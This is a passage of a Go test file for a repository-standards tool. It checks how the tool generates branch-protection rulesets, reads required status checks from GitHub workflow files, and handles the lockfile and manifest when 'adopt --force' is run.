	if !strings.Contains(lefthookGovernedCommand("audit"), "exit 1; fi") {
		t.Fatal("governed command must fail closed when no binary is installed")
	}
	if strings.Contains(optionalToolCommand("govulncheck", "./..."), "exit 1") {
		t.Fatal("optional tools skip when absent")
	}
}

func TestBuildRulesetJSON_Boundary(t *testing.T) {
	empty, err := buildRulesetJSON(config.DefaultPolicy().BranchProtection, nil)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(empty, "required_status_checks") || strings.Contains(empty, "required_signatures") {
		t.Fatalf("no contexts means no status-check rule and never forced signatures:\n%s", empty)
	}
	one, err := buildRulesetJSON(config.DefaultPolicy().BranchProtection, []string{"verify"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(one, `"context": "verify"`) || !strings.Contains(one, `"required_approving_review_count": 1`) {
		t.Fatalf("unexpected ruleset:\n%s", one)
	}
}

// requiredStatusContexts reads the status contexts adoption requires of repoPath, through
// the same forge reader reconcileBranchRuleset calls.
func requiredStatusContexts(repoPath string) ([]string, error) {
	return forge.RequiredStatusContexts(context.Background(), repoPath)
}

func TestRequiredStatusContexts_WorkflowTriggers(t *testing.T) {
	repoPath := t.TempDir()
	wf := filepath.Join(repoPath, ".github", "workflows")
	mustWrite(t, filepath.Join(wf, "a-ci.yml"), "on:\n  pull_request:\n    branches: [main]\njobs:\n  verify:\n    name: Verify Gate\n    runs-on: ubuntu-latest\n  conditional:\n    if: github.ref == 'x'\n    runs-on: ubuntu-latest\n")
	mustWrite(t, filepath.Join(wf, "b-list.yaml"), "on: [push, pull_request]\njobs:\n  build:\n    runs-on: ubuntu-latest\n")
	mustWrite(t, filepath.Join(wf, "c-docs.yml"), "on:\n  pull_request:\n    paths: ['docs/**']\njobs:\n  docs:\n    name: Docs\n")
	mustWrite(t, filepath.Join(wf, "d-release.yml"), "on:\n  push:\n    tags: ['v*']\njobs:\n  release:\n    name: Release\n")
	mustWrite(t, filepath.Join(wf, "e-scalar.yml"), "on: pull_request\njobs:\n  scalar:\n    name: Scalar Job\n")
	mustWrite(t, filepath.Join(wf, "README.md"), "not a workflow")

	got, err := requiredStatusContexts(repoPath)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"Verify Gate", "build", "Scalar Job"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("contexts = %v, want %v", got, want)
	}

	if got, err := requiredStatusContexts(t.TempDir()); err != nil || len(got) != 0 {
		t.Fatalf("no workflows dir must yield no contexts, got %v err=%v", got, err)
	}
	mustWrite(t, filepath.Join(wf, "z-broken.yml"), "on: [\n")
	if _, err := requiredStatusContexts(repoPath); err == nil {
		t.Fatal("a malformed workflow must be reported")
	}
}

// TestRulesetMatchesCheckedInFile guards against drift between the generator and the
// ruleset checked into this repository: re-running adopt on praetor itself must
// reproduce .github/rulesets/main.json exactly.
func TestRulesetMatchesCheckedInFile(t *testing.T) {
	repoRoot, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		t.Fatal(err)
	}
	checkedIn, err := os.ReadFile(filepath.Join(repoRoot, ".github", "rulesets", "main.json"))
	if err != nil {
		t.Fatalf("read checked-in ruleset: %v", err)
	}
	contexts, err := requiredStatusContexts(repoRoot)
	if err != nil {
		t.Fatal(err)
	}
	manifest, err := config.LoadManifest(filepath.Join(repoRoot, ".standards.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	policy := config.DefaultPolicy()
	policy.ApplyOverrides(manifest.Overrides)
	generated, err := buildRulesetJSON(policy.BranchProtection, contexts)
	if err != nil {
		t.Fatal(err)
	}
	var want, got any
	if err := jsonUnmarshal(checkedIn, &want); err != nil {
		t.Fatal(err)
	}
	if err := jsonUnmarshal([]byte(generated), &got); err != nil {
		t.Fatal(err)
	}
	if !deepEqual(want, got) {
		t.Fatalf("generator drifted from .github/rulesets/main.json\nchecked in:\n%s\ngenerated:\n%s", checkedIn, generated)
	}
}

// =========================================================================
// A repository's declaration survives --force (BUG-942, BUG-943)
// =========================================================================

// adoptedRepoDeclaring adopts a fresh repository, then rewrites its manifest to declare a
// different profile, returning the repository path and the shared lock source.
func adoptedRepoDeclaring(t *testing.T, name, profile string) (string, string) {
	t.Helper()
	repoPath := newTestRepo(t, name)
	source := newAdoptLockSource(t)
	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: source, Path: repoPath, Profile: "framework"}); err != nil {
		t.Fatalf("initial adoption failed: %v", err)
	}
	manifestPath := filepath.Join(repoPath, ".standards.yaml")
	declared := strings.Replace(mustRead(t, manifestPath), "- framework", "- "+profile, 1)
	mustWrite(t, manifestPath, declared)
	return repoPath, source
}

// TestAdopt_Positive_ForceRepinsLockToNewlyDeclaredProfile covers the re-pin path that did not
// exist. Publishing an archetype was useless to any repository that already had a lockfile: the
// lock did not pin the new profile, so audit and adopt both refused it, and the only way through
// was deleting .standards.lock outright and discarding every other pin.
func TestAdopt_Positive_ForceRepinsLockToNewlyDeclaredProfile(t *testing.T) {
	repoPath, source := adoptedRepoDeclaring(t, "repin-repo", "app-service")
	if lock := mustRead(t, filepath.Join(repoPath, ".standards.lock")); !strings.Contains(lock, "framework") {
		t.Fatalf("precondition: the lock should still pin the original profile, got %s", lock)
	}
	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: source, Path: repoPath, Force: true}); err != nil {
		t.Fatalf("forced re-pin failed: %v", err)
	}
	lock := mustRead(t, filepath.Join(repoPath, ".standards.lock"))
	if !strings.Contains(lock, "app-service") {
		t.Errorf("--force must re-pin the lock to the declared profile, got %s", lock)
	}
}

// TestAdopt_Negative_ForceDoesNotRewriteTheDeclaration is the defect's own shape. The manifest is
// the repository's statement of what it is, not an artifact adoption generates, so a forced run
// must leave it byte for byte. The previous behaviour replaced a declared profile and facet set
// with detected ones and still reported the repository successfully adopted.
func TestAdopt_Negative_ForceDoesNotRewriteTheDeclaration(t *testing.T) {
	repoPath, source := adoptedRepoDeclaring(t, "declaration-repo", "app-service")
	manifestPath := filepath.Join(repoPath, ".standards.yaml")
	before := mustRead(t, manifestPath)
	if _, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: source, Path: repoPath, Force: true}); err != nil {
		t.Fatalf("forced adoption failed: %v", err)
	}
	if after := mustRead(t, manifestPath); after != before {
		t.Errorf("--force rewrote the declaration.\nbefore:\n%s\nafter:\n%s", before, after)
	}
}

// TestAdopt_Boundary_ForceStillScaffoldsAnAbsentManifest pins the other side of the same
// condition. Preserving a declaration must not stop adoption from creating one where there is
// none, which is the case the synthesized manifest exists for.
func TestAdopt_Boundary_ForceStillScaffoldsAnAbsentManifest(t *testing.T) {
	repoPath := newTestRepo(t, "absent-manifest-repo")
	rep, err := Adopt(context.Background(), AdoptOptions{LockSourceRoot: newAdoptLockSource(t), Path: repoPath, Profile: "framework", Force: true})
	if err != nil {
		t.Fatalf("Adopt --force failed: %v", err)
	}
	if !contains(rep.CreatedFiles, ".standards.yaml") {
		t.Fatalf("a repository with no manifest must still get one, got created=%v", rep.CreatedFiles)
	}
	if manifest := mustRead(t, filepath.Join(repoPath, ".standards.yaml")); !strings.Contains(manifest, "framework") {
		t.Errorf("the scaffolded manifest must record the resolved profile, got %s", manifest)
	}
}
